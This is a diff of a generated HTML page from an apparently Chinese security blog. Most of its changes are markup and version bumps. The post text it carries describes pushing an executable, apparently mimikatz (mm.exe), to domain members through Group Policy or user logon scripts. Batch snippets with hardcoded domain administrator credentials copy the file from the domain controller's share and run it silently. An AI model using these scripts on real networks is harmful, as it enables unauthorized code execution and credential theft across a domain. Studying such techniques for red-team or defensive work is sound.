@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 6.3.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-pig.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-pig.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-pig.png">
@@ -90,6 +90,8 @@
   </style>
 </noscript>
 
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -281,7 +283,7 @@
 <h2 id="方法1"><a class="header-anchor" href="#方法1">¶</a>方法1</h2>
 <p>查找大量相关资料，都没有现成的方法直接下发exe，然而吐司竟然也没有，最后，锁定了<strong>组策略开机脚本</strong></p>
 <p>域成员登录时，执行域控提前部署好的bat脚本，通过此脚本，IPC连接到域控，copy文件，在成员上执行。</p>
-<a id="more"></a>
+<span id="more"></span>
 <p>环境：</p>
 <table>
 <thead>
@@ -320,13 +322,13 @@
 <p>右键<em>ADcontrol</em>——<em>编辑</em>——<em>用户配置</em>——<em>windows设置</em>——<em>脚本</em>——<em>登录</em>——<em>显示文件</em>——新建<em>ADControl.bat</em></p>
 <p><img src="AD-04.png" alt="AD-04"></p>
 <p>代码如下</p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>  p@ssw0rd /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test\</span><br><span class="line"><span class="built_in">cmd</span> /c c:\test\mm.exe</span><br><span class="line"><span class="built_in">net</span> use * /<span class="built_in">del</span> /y</span><br></pre></td></tr></table></figure>
+<figure class="highlight bat"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>  p@ssw0rd /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test\</span><br><span class="line"><span class="built_in">cmd</span> /c c:\test\mm.exe</span><br><span class="line"><span class="built_in">net</span> use * /<span class="built_in">del</span> /y</span><br></pre></td></tr></tbody></table></figure>
 <p><em>添加</em>——<em>浏览</em>——选择<em>ADControl.bat</em></p>
 <p><img src="AD-05.png" alt="AD-05"></p>
 <p>右键<em>OU</em>——<em>链接现有GPO</em>——选择<em>ADcontrol</em></p>
 <p><img src="AD-06.png" alt="AD-06"></p>
 <h3 id="3-刷新策略"><a class="header-anchor" href="#3-刷新策略">¶</a>(3) 刷新策略</h3>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></tbody></table></figure>
 <p><img src="AD-07.png" alt="AD-07"></p>
 <h3 id="4-重启域成员"><a class="header-anchor" href="#4-重启域成员">¶</a>(4) 重启域成员</h3>
 <p>使用新建账户(redn3ck)登录，成功copy文件，并执行</p>
@@ -334,10 +336,10 @@
 <h2 id="方法2"><a class="header-anchor" href="#方法2">¶</a>方法2</h2>
 <h3 id="1-创建bat"><a class="header-anchor" href="#1-创建bat">¶</a>(1) 创建bat</h3>
 <p>logon默认路径：<code>C:\Windows\SYSVOL\sysvol\red.com\scripts</code></p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//logon.bat</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span> <span class="number">12345</span>RDzxcvb! /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test</span><br><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> c:\test\mm.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight bat"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//logon.bat</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span> <span class="number">12345</span>RDzxcvb! /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test</span><br><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> c:\test\mm.exe</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="2-执行"><a class="header-anchor" href="#2-执行">¶</a>(2) 执行</h3>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user redn3ck /scriptpath:logon.bat</span><br></pre></td></tr></table></figure>
-<p><font color=red>注：执行时需要<code>cmd /c start</code>否则开机会有cmd窗口 </font></p>
+<figure class="highlight bat"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user redn3ck /scriptpath:logon.bat</span><br></pre></td></tr></tbody></table></figure>
+<p><font color="red">注：执行时需要<code>cmd /c start</code>否则开机会有cmd窗口 </font></p>
 <h2 id="方法3"><a class="header-anchor" href="#方法3">¶</a>方法3</h2>
 <p><em>Domain computer</em>——<em>管理</em>——<em>添加用户到远程管理组</em></p>
 <h1>0x03 总结</h1>
@@ -470,14 +472,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-count">49</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -522,7 +524,7 @@
 <div class="copyright">
   
   &copy; 2018 – 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
